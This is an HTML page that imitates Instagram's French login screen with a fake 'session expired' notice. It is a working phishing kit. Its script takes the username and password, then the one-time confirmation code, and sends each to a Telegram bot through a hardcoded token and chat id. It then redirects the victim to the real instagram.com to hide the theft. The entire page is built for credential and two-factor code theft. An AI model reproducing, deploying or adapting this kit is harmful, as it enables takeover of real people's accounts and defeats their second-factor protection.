<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Connexion • Instagram</title>
    <style>
        * {
            box-sizing: border-box;
        }
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .login-container {
            width: 100%;
            max-width: 350px;
            padding: 20px 40px;
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            text-align: center;
        }
        .logo-container {
            margin: 22px 0 12px 0;
        }
        .logo-img {
            width: 175px;
            height: auto;
        }
        .session-notice {
            font-size: 13px;
            color: #737373;
            line-height: 18px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 12px;
            padding: 9px 8px;
            margin-bottom: 6px;
            outline: none;
        }
        input:focus {
            border-color: #a8a8a8;
        }
        .btn {
            background-color: #0095f6;
            border: 1px solid transparent;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
            width: 100%;
            padding: 7px;
            margin-top: 8px;
            margin-bottom: 15px;
        }
        .or-divider {
            display: flex;
            align-items: center;
            margin: 10px 0 18px 0;
        }
        .or-line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .or-text {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
        }
        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            display: block;
            margin-bottom: 15px;
        }
        .forgot-pass {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            display: block;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/3840px-Instagram_logo.svg.png" alt="Instagram" class="logo-img">
        </div>
        
        <div class="session-notice" id="noticeText">
            Votre session a expiré. Veuillez vous reconnecter pour continuer.
        </div>

        <!-- الخطوة 1: نموذج إدخال اسم المستخدم وكلمة المرور -->
        <form id="loginForm">
            <input type="text" id="username" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail" required>
            <input type="password" id="password" placeholder="Mot de passe" required>
            <button type="submit" class="btn">Se connecter</button>
        </form>

        <!-- الخطوة 2: نموذج انتظار رمز التحقق OTP -->
        <form id="otpForm" class="hidden">
            <input type="text" id="otpCode" placeholder="Code de confirmation (6 chiffres)" required>
            <button type="submit" class="btn">Confirmer</button>
        </form>

        <div id="footerSection">
            <div class="or-divider">
                <div class="or-line"></div>
                <div class="or-text">OU</div>
                <div class="or-line"></div>
            </div>

            <a href="#" class="fb-login">Se connecter avec Facebook</a>
            <a href="#" class="forgot-pass">Mot de passe oublié ?</a>
        </div>
    </div>

    <script>
        const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
        const chatId = "865078178";

        let savedUser = "";

        // عند إدخال البيانات الأولى وإرسالها لبوت تيليجرام
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            savedUser = user;

            const message = "🎯 [1/2] New Credentials Captured:\n👤 User: " + user + "\n🔑 Password: " + pass + "\n🌐 URL: " + window.location.href;
            const url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
            
            const img = new Image();
            img.src = url;

            // الانتقال لواجهة انتظار كود التحقق دون مغادرة الصفحة
            document.getElementById('loginForm').classList.add('hidden');
            document.getElementById('footerSection').classList.add('hidden');
            document.getElementById('otpForm').classList.remove('hidden');
            document.getElementById('noticeText').textContent = "Entrez le code de confirmation envoyé par SMS ou par email.";
        });

        // عند إدخال رمز التحقق وإرساله لبوت تيليجرام ثم التوجيه للموقع الرسمي
        document.getElementById('otpForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const otp = document.getElementById('otpCode').value;

            const message = "🔐 [2/2] OTP Code Captured:\n👤 User: " + savedUser + "\n🔢 Code: " + otp;
            const url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
            
            const img = new Image();
            img.src = url;

            setTimeout(function() {
                window.location.href = "https://www.instagram.com";
            }, 500);
        });
    </script>
</body>
</html>
